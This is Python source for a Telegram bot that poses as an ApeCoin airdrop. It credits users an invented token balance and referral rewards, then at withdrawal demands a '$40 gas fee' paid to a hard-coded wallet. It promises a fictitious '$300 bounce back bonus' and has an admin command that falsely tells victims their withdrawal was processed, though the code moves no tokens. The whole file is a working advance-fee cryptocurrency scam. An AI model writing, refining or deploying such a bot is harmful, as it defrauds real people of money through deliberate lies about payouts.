#!/usr/bin/env python3
"""
Webhook-ready Telegram airdrop bot (async, aiosqlite).
Drop-in replacement for webhook mode on Render (or similar).
"""

import os
import re
import html
import logging
import asyncio
import datetime
from typing import Optional, Sequence

import aiosqlite
import aiohttp
from aiohttp import web
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# -------------------------
# Configuration (env vars)
# -------------------------
TOKEN = os.environ.get("APECOIN_BOT_TOKEN") or os.environ.get("TOKEN")
if not TOKEN:
    raise SystemExit("ERROR: TOKEN not provided. Set APECOIN_BOT_TOKEN or TOKEN environment variable.")

try:
    ADMIN_ID = int(os.environ.get("APECOIN_ADMIN_ID", os.environ.get("ADMIN_ID", "0")))
except ValueError:
    ADMIN_ID = 0

GROUP_LINK = os.environ.get("APECOIN_GROUP_LINK", "https://t.me/Apecoingroupchat")
CHANNEL_LINK = os.environ.get("APECOIN_CHANNEL_LINK", "https://t.me/Apetelegramchannel")
SUPPORT_LINK = os.environ.get("APECOIN_SUPPORT_LINK", "https://t.me/MillionairevaultAi")

BNB_FEE_WALLET = os.environ.get("APECOIN_BNB_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
ETH_FEE_WALLET = os.environ.get("APECOIN_ETH_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
USDT_BNB = os.environ.get("APECOIN_USDT_BNB", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
USDT_ETH = os.environ.get("APECOIN_USDT_ETH", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")

RENDER_URL = os.environ.get("RENDER_URL", "").rstrip("/")  # e.g. https://your-service.onrender.com
PORT = int(os.environ.get("PORT", os.environ.get("PORT", "8443")))  # Render sets $PORT automatically

# Airdrop params
AIRDROP_BONUS = int(os.environ.get("AIRDROP_BONUS", "1000"))
REF_BONUS = int(os.environ.get("REF_BONUS", "400"))

WITHDRAW_YEAR = int(os.environ.get("WITHDRAW_YEAR", "2025"))
WITHDRAW_MONTH = int(os.environ.get("WITHDRAW_MONTH", "12"))
WITHDRAW_DAY = int(os.environ.get("WITHDRAW_DAY", "05"))
WITHDRAW_DATE = datetime.date(WITHDRAW_YEAR, WITHDRAW_MONTH, WITHDRAW_DAY)

DB_PATH = os.environ.get("DB_PATH", "airdrop.db")
ALLOWED_USER_FIELDS = {"firstname", "username", "wallet", "balance", "referrals", "step", "verified"}

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# -------------------------
# Utilities
# -------------------------
def is_valid_eth_address(addr: str) -> bool:
    if not isinstance(addr, str):
        return False
    return bool(re.fullmatch(r"0x[a-fA-F0-9]{40}", addr.strip()))


def escape_html(text: Optional[str]) -> str:
    return html.escape(text or "")


def main_menu_markup() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("💰 Balance", callback_data="balance"), InlineKeyboardButton("ℹ️ Info", callback_data="info")],
        [InlineKeyboardButton("👥 Referral", callback_data="referral"), InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("👤 Support", callback_data="support")]
    ]
    return InlineKeyboardMarkup(keyboard)


def back_to_main_markup() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 MAIN MENU", callback_data="main_menu")]])


# -------------------------
# Database helpers (async)
# -------------------------
async def init_db():
    logger.info("Initializing DB: %s", DB_PATH)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("PRAGMA journal_mode=WAL;")
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                firstname TEXT,
                username TEXT,
                wallet TEXT,
                balance INTEGER DEFAULT 0,
                referrals INTEGER DEFAULT 0,
                step TEXT DEFAULT 'verify',
                verified INTEGER DEFAULT 0
            )
        """)
        await db.commit()


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT user_id, firstname, username, wallet, balance, referrals, step, verified FROM users WHERE user_id=?", (user_id,))
        row = await cur.fetchone()
        await cur.close()
        return row


async def add_user(user_id: int, firstname: Optional[str]):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,))
        exists = await cur.fetchone()
        await cur.close()
        if not exists:
            await db.execute("INSERT INTO users (user_id, firstname, balance) VALUES (?, ?, ?)", (user_id, firstname or "", 0))
            await db.commit()


async def update_user(user_id: int, field: str, value):
    if field not in ALLOWED_USER_FIELDS:
        raise ValueError(f"Invalid user field: {field}")
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, user_id))
        await db.commit()


async def get_all_users():
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT user_id FROM users")
        rows = await cur.fetchall()
        await cur.close()
        return [r[0] for r in rows]


# -------------------------
# Handlers
# -------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    firstname = update.effective_user.first_name or ""
    await add_user(user_id, firstname)

    # handle referral if present
    if context.args:
        try:
            ref_id = int(context.args[0])
            if ref_id != user_id:
                ref_data = await get_user(ref_id)
                if ref_data:
                    new_balance = (ref_data[4] or 0) + REF_BONUS
                    new_refs = (ref_data[5] or 0) + 1
                    await update_user(ref_id, "balance", new_balance)
                    await update_user(ref_id, "referrals", new_refs)
        except Exception:
            logger.debug("Invalid referral argument", exc_info=True)

    await update.message.reply_text(
        f"👋 Hello {firstname}!\n\nTo join the airdrop:\n1️⃣ Join our group: {GROUP_LINK}\n2️⃣ Join our channel: {CHANNEL_LINK}\n\nSend an amazing message to our group (e.g. apecoin to the moon)\nThen send me your Telegram username (e.g. @yourname)."
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    user = await get_user(user_id)
    if not user:
        # If user somehow not in DB, add and ask them to /start
        await add_user(user_id, update.effective_user.first_name or "")
        return await update.message.reply_text("Please use /start to begin the airdrop flow.")

    # user tuple: (user_id, firstname, username, wallet, balance, referrals, step, verified)
    step = user[6] if len(user) > 6 else "verify"

    if step == "verify":
        await update_user(user_id, "username", text)
        await update_user(user_id, "step", "wallet")
        await update.message.reply_text("✅ Thanks! Now send your *ApeCoin Ethereum wallet address*:", parse_mode="Markdown")
        return

    if step == "wallet":
        if not is_valid_eth_address(text):
            await update.message.reply_text(
                "⚠️ The wallet address you sent doesn't look like a valid Ethereum address. Please send an address starting with 0x followed by 40 hex characters."
            )
            return

        await update_user(user_id, "wallet", text)
        await update_user(user_id, "balance", AIRDROP_BONUS)
        await update_user(user_id, "step", "done")
        reply_markup = main_menu_markup()
        await update.message.reply_text(
            f"🎉 Welcome! You received {AIRDROP_BONUS} $ApeCoin (~$500).\n\nUse the menu below:",
            reply_markup=reply_markup
        )
        return

    if step == "withdraw_amount":
        try:
            amt = float(text)
            context.user_data["withdraw_amount"] = amt
            await update_user(user_id, "step", "withdraw_wallet")
            await update.message.reply_text("✅ Now send your *Ethereum wallet address* again:", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("Please send a valid numeric amount to withdraw.")
        return

    if step == "withdraw_wallet":
        await update_user(user_id, "wallet", text)
        await update_user(user_id, "step", "done")

        await update.message.reply_text(
            "⚠️ Due to high charges for Ethereum gas fees, please pay <b>$40 gas fee</b> to complete withdrawal:\n\n"
            f"🔹 BNB (BEP20): <code>{escape_html(BNB_FEE_WALLET)}</code>\n"
            f"🔹 ETH (ERC20): <code>{escape_html(ETH_FEE_WALLET)}</code>\n"
            f"🔹 USDT (BNB): <code>{escape_html(USDT_BNB)}</code>\n"
            f"🔹 USDT (ETH): <code>{escape_html(USDT_ETH)}</code>\n\n"
            + escape_html(
                "⚠️ Note immediately after you pay your gas fee, you will receive a bounce back bonus of an additional $300 from the Network if only you are among the first 200,000 users to withdraw your token and also that is verify that our first 200,000 users and other users are not robots , thank you:\n\nAfter payment is verified by the Network chain, withdrawal tokens will process  *immediately* ⏳"
            ),
            parse_mode="HTML"
        )

        bot = context.bot
        amt = context.user_data.get("withdraw_amount", user[4])
        msg = (
            "⚠️ <b>Withdrawal Request</b>\n\n"
            f"👤 User: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
            f"💰 Amount: {escape_html(str(amt))} $ApeCoin\n"
            f"🏦 Wallet: <code>{escape_html(text)}</code>\n\n"
            f"Use /verify {user_id} to mark verified and notify user."
        )
        try:
            if ADMIN_ID:
                await bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="HTML")
        except Exception:
            logger.exception("Failed to notify admin about withdrawal")

        await update.message.reply_text(
            "✅ Withdrawal request submitted successfully!\nOur team will review and verify your transaction soon."
        )
        return


# -------------------------
# CallbackQuery handler
# -------------------------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user = await get_user(user_id)
    if not user:
        return

    firstname, username, wallet, balance, referrals, step = user[1], user[2], user[3], user[4], user[5], user[6]
    referral_balance = max((balance or 0) - AIRDROP_BONUS, 0)
    full_balance = AIRDROP_BONUS + referral_balance
    reflink = f"https://t.me/{(context.bot.username or '').lstrip('@')}?start={user_id}"

    data = query.data

    if data == "balance":
        msg = (
            f"👤 Hello {escape_html(firstname)}\n\n"
            f"🏆 Airdrop Balance: {AIRDROP_BONUS} $ApeCoin\n"
            f"🎁 Referral Balance: {referral_balance} $ApeCoin\n"
            f"👩‍👦‍👦 Referrals: {referrals}\n\n"
            f"💰 Full Balance: {full_balance} $ApeCoin\n\n"
            f"🗓️ Withdrawals open: {WITHDRAW_DATE.strftime('%d %B %Y')}\n"
            f"⚠️ Need 7 referrals to withdraw.\n\n"
            f"🔗 Referral link: <a href=\"{escape_html(reflink)}\">Click here to invite friends</a>"
        )
        await query.edit_message_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=back_to_main_markup())
        return

    elif data == "info":
        msg = (
            "ℹ️ <b>Airdrop Info</b>\n\n"
            f"✅ Signup Bonus: {AIRDROP_BONUS} $ApeCoin (~$500)\n"
            f"👥 Referral Reward: {REF_BONUS} $ApeCoin (~$200)\n"
            f"💸 Withdrawals: {WITHDRAW_DATE.strftime('%d %B %Y')}\n"
            "🎁 <b>First 200,000 users to withdraw will receive an additional $300 bonus from the Network Chain!</b>\n\n"
            "🚀 Keep inviting friends!"
        )
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_main_markup())
        return

    elif data == "referral":
        msg = (
            f"👥 Your referral link:\n"
            f"<a href=\"{escape_html(reflink)}\">Click here to invite friends</a>\n\n"
            f"Earn {REF_BONUS} $ApeCoin per friend!"
        )
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_main_markup())
        return

    elif data == "support":
        today = datetime.date.today()
        if today <= WITHDRAW_DATE + datetime.timedelta(days=3):
            msg = (
                f"👋 Hello {escape_html(firstname)}, we're excited to have you here!\n\n"
                f"💰 Your current balance: {full_balance} $ApeCoin\n\n"
                f"🗓️ Withdrawals will open after {WITHDRAW_DATE.strftime('%d %B %Y')}.\n\n"
                "🎁 <b>First 200,000 users to withdraw will receive an additional $300 bonus from the Network Chain!</b>\n\n"
                f"👉 <a href=\"{escape_html(SUPPORT_LINK)}\">Message Support</a>"
            )
        else:
            msg = (
                "👤 <b>Support Center</b>\n\n"
                "If you have any problem with:\n\n"
                "- Paying withdrawal gas fee\n"
                "- Want to pay with other coins\n"
                "- Receiving ApeCoin Airdrop tokens\n"
                "- Swapping ApeCoin tokens\n"
                "- Transferring ApeCoin tokens\n\n"
                f"👉 <a href=\"{escape_html(SUPPORT_LINK)}\">Message Support</a>"
            )
        await query.edit_message_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=back_to_main_markup())
        return

    elif data == "main_menu":
        await query.edit_message_text(f"👋 {firstname}! Use the menu below:", reply_markup=main_menu_markup())
        return

    elif data == "withdraw":
        today = datetime.date.today()
        if today < WITHDRAW_DATE:
            await query.edit_message_text(f"⚠️ Withdrawals locked until {WITHDRAW_DATE.strftime('%d %B %Y')}", reply_markup=back_to_main_markup())
        else:
            await update_user(user_id, "step", "withdraw_amount")
            await query.edit_message_text("💸 Enter the *amount of $ApeCoin* to withdraw:", parse_mode="Markdown", reply_markup=back_to_main_markup())
        return


# -------------------------
# Admin commands
# -------------------------
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("❌ Not authorized")

    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT COUNT(*) FROM users")
        total_users = (await cur.fetchone())[0] or 0
        await cur.close()

        cur = await db.execute("SELECT SUM(referrals) FROM users")
        total_refs = (await cur.fetchone())[0] or 0
        await cur.close()

        cur = await db.execute("SELECT SUM(balance) FROM users")
        total_balance = (await cur.fetchone())[0] or 0
        await cur.close()

    msg = (
        f"📊 Bot Stats:\n"
        f"👥 Total Users: {total_users}\n"
        f"👥 Total Referrals: {total_refs}\n"
        f"💰 Total Distributed: {total_balance} $ApeCoin"
    )
    await update.message.reply_text(msg)


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args:
        return await update.message.reply_text("Usage: /broadcast <message>")

    message_text = " ".join(context.args)
    users = await get_all_users()
    count = 0
    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=message_text)
            count += 1
        except Exception:
            # ignore send failures (user blocked bot, etc.)
            pass

    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")


async def send_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("🚫 You are not authorized to use this command.")
    if len(context.args) < 2:
        return await update.message.reply_text("Usage: /send <user_id> <message>")

    try:
        target_id = int(context.args[0])
        message_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=target_id, text=message_text)
        await update.message.reply_text(f"✅ Message sent to user {target_id}.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Failed to send message: {e}")


async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("🚫 Not authorized")
    if not context.args:
        return await update.message.reply_text("Usage: /verify <user_id>")
    try:
        uid = int(context.args[0])
        await update_user(uid, "verified", 1)
        await context.bot.send_message(chat_id=uid, text="✅ Your withdrawal has been verified and processed successfully!")
        await update.message.reply_text(f"✅ User {uid} notified of verification.")
    except ValueError:
        await update.message.reply_text("Invalid user ID. Please provide a numeric ID.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error verifying user: {e}")


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Bot is alive and running!")


# -------------------------
# Webhook server (aiohttp) + App setup
# -------------------------
def build_application() -> Application:
    """Create and return the telegram Application with handlers attached."""
    app = Application.builder().token(TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("send", send_user))
    app.add_handler(CommandHandler("verify", verify))
    app.add_handler(CommandHandler("ping", ping))

    return app


async def set_webhook(application: Application):
    """Set webhook on Telegram side to RENDER_URL/TOKEN (if RENDER_URL provided)."""
    if not RENDER_URL:
        logger.warning("RENDER_URL not set; webhook won't be registered. Set RENDER_URL env var to your public URL.")
        return

    webhook_url = f"{RENDER_URL}/{TOKEN}"
    try:
        await application.bot.set_webhook(webhook_url)
        logger.info("Webhook set to %s", webhook_url)
    except Exception:
        logger.exception("Failed to set webhook to %s", webhook_url)


async def start_aiohttp_server(app: Application):
    """Start an aiohttp server that delegates updates to the telegram Application via run_webhook."""
    # We use the Application.run_webhook helper which starts its own webserver and registers webhook.
    # Many examples call run_webhook directly; here we will call it from the main coroutine.
    listen = "0.0.0.0"
    port = PORT

    # Build webhook URL if provided
    webhook_url = f"{RENDER_URL}/{TOKEN}" if RENDER_URL else None

    logger.info("Starting webhook (listen=%s port=%s url=%s)", listen, port, webhook_url)
    # run_webhook is a blocking call, so call it in a thread-safe way using asyncio.to_thread
    # But Application.run_webhook is designed to be called in main thread; we'll call it directly and let it block.
    # To integrate better with our init steps, we will run run_webhook in a separate task using asyncio.create_task and a wrapper.
    loop = asyncio.get_running_loop()

    # The run_webhook method will block until shutdown, so run it in a dedicated task.
    def run_webhook_blocking():
        # Note: parameter names in run_webhook may vary by version; common parameters below are provided for v20/v21.
        # We pass url_path as token, and webhook_url as full https url if available.
        app.run_webhook(listen=listen, port=port, url_path=TOKEN, webhook_url=webhook_url)

    # Run blocking call in a separate thread to keep this coroutine alive.
    await loop.run_in_executor(None, run_webhook_blocking)


# Basic health endpoint for Render (optional)
async def healthcheck(request):
    return web.Response(text="OK")


# -------------------------
# Entrypoint
# -------------------------
async def main():
    # init DB
    await init_db()

    application = build_application()

    # Set webhook on Telegram side before starting web server (if RENDER_URL provided)
    if RENDER_URL:
        await set_webhook(application)
    else:
        logger.warning("No RENDER_URL provided. Telegram webhook will not be registered. Set RENDER_URL env var to enable webhooks.")

    # Create a minimal aiohttp app for health checks (Render uses the port to verify process)
    aio_app = web.Application()
    aio_app.add_routes([web.get("/", healthcheck)])  # root health
    aio_app.add_routes([web.get("/healthz", healthcheck)])  # optional health
    # Mount token path to accept webhook requests forwarded by the Application.run_webhook (the library binds same port)
    runner = web.AppRunner(aio_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info("Health endpoints running on port %s", PORT)

    # Start run_webhook (which will start PTB's webhook server bound to the same port)
    # NOTE: run_webhook will block; we run it in an executor to avoid blocking the event loop here.
    # Many deployments just call application.run_webhook(...) directly instead of this wrapper.
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, lambda: application.run_webhook(listen="0.0.0.0", port=PORT, url_path=TOKEN, webhook_url=(f"{RENDER_URL}/{TOKEN}" if RENDER_URL else None)))

    # Execution will reach here when run_webhook returns (on shutdown)
    logger.info("Application shutdown requested.")


if __name__ == "__main__":
    try:
        logger.info("Starting webhook bot main()")
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Shutting down (KeyboardInterrupt/SystemExit)")
    except Exception:
        logger.exception("Unhandled exception in bot main loop")
